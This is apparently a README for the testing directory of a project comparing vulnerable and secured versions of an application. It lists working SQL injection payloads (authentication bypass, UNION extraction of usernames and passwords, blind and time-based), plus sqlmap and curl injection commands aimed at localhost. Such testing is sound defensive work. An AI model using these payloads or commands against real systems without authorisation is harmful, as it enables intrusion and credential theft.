# Testing Scripts and Tools

This directory contains testing resources for evaluating SQL injection vulnerabilities and performance.

## Structure

```
testing/
├── attack-payloads/        # SQL injection test payloads
├── performance/            # Performance testing scripts
└── results/                # Test output and logs
```

## Attack Payload Categories

### 1. Authentication Bypass
```
' OR '1'='1'--
' OR 1=1--
admin'--
' OR 'x'='x
```

### 2. Union-Based Injection
```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL, NULL--
' UNION SELECT 1, username, password FROM Users--
```

### 3. Boolean-Based Blind
```
' AND 1=1--
' AND 1=2--
' AND (SELECT COUNT(*) FROM Users) > 0--
```

### 4. Time-Based Blind
```
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--
```

## Testing Tools

### sqlmap
```bash
# Test login endpoint
sqlmap -u "http://localhost:5000/api/auth/login" --data="username=test&password=test" --batch

# Test search endpoint
sqlmap -u "http://localhost:5000/api/users/search?name=test" --batch --dbs
```

### Apache Bench
```bash
# Performance baseline
ab -n 1000 -c 10 http://localhost:5000/api/users/1

# Compare vulnerable vs secured
ab -n 1000 -c 10 http://localhost:5000/api/users/search?name=john
```

### Manual Testing with curl
```bash
# Test authentication bypass
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"anything"}'

# Test search injection
curl "http://localhost:5000/api/users/search?name=test' OR '1'='1"
```

## Test Procedure

1. **Start vulnerable version** of each implementation
2. **Run attack payloads** and document which succeed
3. **Start secured version** of each implementation
4. **Re-run same attacks** and verify they fail
5. **Run performance tests** on both versions
6. **Document findings** in `/results/` folder

